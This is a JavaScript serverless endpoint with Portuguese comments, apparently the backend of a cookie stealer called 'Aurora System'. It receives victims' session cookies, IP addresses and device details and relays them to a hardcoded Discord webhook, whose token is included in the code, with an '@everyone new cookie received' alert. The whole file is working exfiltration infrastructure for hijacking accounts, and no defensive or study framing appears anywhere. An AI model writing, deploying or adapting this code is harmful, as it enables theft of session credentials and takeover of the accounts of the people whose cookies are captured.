export default async function handler(req, res) {
  // Permitir CORS
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  // Responder preflight requests
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  // Apenas POST
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const { cookie, ip, device, timestamp } = req.body;

    // Validar dados
    if (!cookie || cookie.length < 50) {
      return res.status(400).json({ error: 'Cookie inválido' });
    }

    // SUA WEBHOOK AQUI - SEGURA NO BACKEND
    const webhookURL = 'https://canary.discord.com/api/webhooks/1477057706568323195/4545g7HNyqcjMCkJe2t95-djEoA-kuXgu-VY1u_zb6slpT3lpdmbwyxDl8urWU51Effi';

    const embed = {
      content: '@everyone ✦ **NOVO COOKIE RECEBIDO**',
      embeds: [{
        title: '🍪 Cookie Recebido',
        color: 0x6366f1,
        fields: [
          { name: '📝 Cookie', value: '```' + cookie + '```' },
          { name: '🌐 IP Address', value: '```' + ip + '```', inline: true },
          { name: '📱 Dispositivo', value: '```' + device + '```', inline: true },
          { name: '⏰ Horário', value: timestamp, inline: true }
        ],
        footer: { text: 'Aurora System • Vercel' },
        timestamp: new Date().toISOString()
      }]
    };

    // Enviar para o Discord
    const response = await fetch(webhookURL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(embed)
    });

    if (!response.ok) {
      throw new Error('Falha ao enviar para Discord');
    }

    return res.status(200).json({ success: true });
    
  } catch (error) {
    console.error('Erro:', error);
    return res.status(500).json({ error: 'Erro interno' });
  }
}